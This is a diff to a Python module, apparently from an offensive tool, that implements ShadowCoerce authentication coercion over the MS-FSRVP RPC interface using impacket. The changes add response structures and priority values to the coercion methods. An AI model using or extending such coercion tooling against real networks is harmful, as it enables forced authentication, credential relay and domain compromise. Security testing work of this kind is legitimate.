@@ -5,7 +5,7 @@ ShadowCoerce - abuses shadow copy management to force authentication.
 
 from __future__ import annotations
 
-from impacket.dcerpc.v5.dtypes import WSTR
+from impacket.dcerpc.v5.dtypes import LONG, WSTR
 from impacket.dcerpc.v5.ndr import NDRCALL
 
 from coercex.methods.base import CoercionMethod, PipeBinding
@@ -30,9 +30,17 @@ class _IsPathSupported(NDRCALL):
     structure = (("ShareName", WSTR),)
 
 
+class _IsPathSupportedResponse(NDRCALL):
+    structure = (("ErrorCode", LONG),)
+
+
 class _IsPathShadowCopied(NDRCALL):
     opnum = 9
     structure = (("ShareName", WSTR),)
+
+
+class _IsPathShadowCopiedResponse(NDRCALL):
+    structure = (("ErrorCode", LONG),)
 
 
 def _trigger_is_path_supported(dce, path, target):
@@ -59,6 +67,7 @@ def get_methods() -> list[CoercionMethod]:
             pipe_bindings=list(FSRVP_PIPES),
             path_styles=list(FSRVP_PATH_STYLES),
             trigger_fn=_trigger_is_path_supported,
+            priority=6,  # ShadowCoerce - requires File Server VSS Agent
         ),
         CoercionMethod(
             protocol_short=PROTOCOL_SHORT,
@@ -69,5 +78,6 @@ def get_methods() -> list[CoercionMethod]:
             pipe_bindings=list(FSRVP_PIPES),
             path_styles=list(FSRVP_PATH_STYLES),
             trigger_fn=_trigger_is_path_shadow_copied,
+            priority=6,  # ShadowCoerce variant
         ),
     ]
